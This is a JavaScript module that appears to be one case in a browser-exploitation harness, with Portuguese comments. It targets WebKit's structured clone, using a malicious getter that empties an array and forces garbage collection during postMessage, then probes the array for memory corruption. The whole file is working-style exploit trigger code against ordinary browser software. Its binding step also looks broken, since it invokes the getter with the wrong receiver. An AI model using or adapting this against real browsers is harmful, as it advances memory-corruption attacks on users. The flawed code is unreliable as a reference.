import { GCOracle } from '../mod_executor.js';

export default {
    id:       'STRUCTURED_CLONE_MUTATION',
    category: 'Concurrency',
    risk:     'CRITICAL',
    description:
        'Ataca o SerializedScriptValue (Structured Clone) via getter malicioso. ' +
        'O Array é destruído e o GC é forçado sincronamente ENQUANTO o C++ o copia.',

    setup: function() {
        this.vulnArray = [1.1, 2.2, 3.3, 4.4];
        this.channel = new MessageChannel();
        
        this.evilPayload = {
            a: 1,
            b: 2,
            get c() {
                // Mutação síncrona: Encolhemos o array
                this.vulnArray.length = 0;
                
                // Forçamos limpeza imediata do IsoHeap com arrays gigantes
                let trash = [];
                for(let i=0; i<15; i++) trash.push(new Float64Array(1024 * 512));
                return 3;
            }
        };
        // Bind manual para o getter conseguir aceder ao array
        this.evilPayload.c = this.evilPayload.c.bind(this);
        this.evilPayload.d = this.vulnArray; 

        // 🚨 Oráculo: Vamos vigiar se o array C++ morre
        if (GCOracle.registry) GCOracle.registry.register(this.vulnArray, `${this.id}_array`);
    },

    trigger: function() {
        try {
            // O WebKit itera as chaves e, ao bater no getter 'c', o array 'd' é corrompido
            this.channel.port1.postMessage(this.evilPayload);
        } catch(e) {}
    },

    probe: [
        s => s.vulnArray.length,
        s => s.vulnArray[0],
        s => s.vulnArray[3],
        s => typeof s.vulnArray[0]
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilPayload = null;
        try { this.channel.port1.close(); } catch(e){}
    }
};
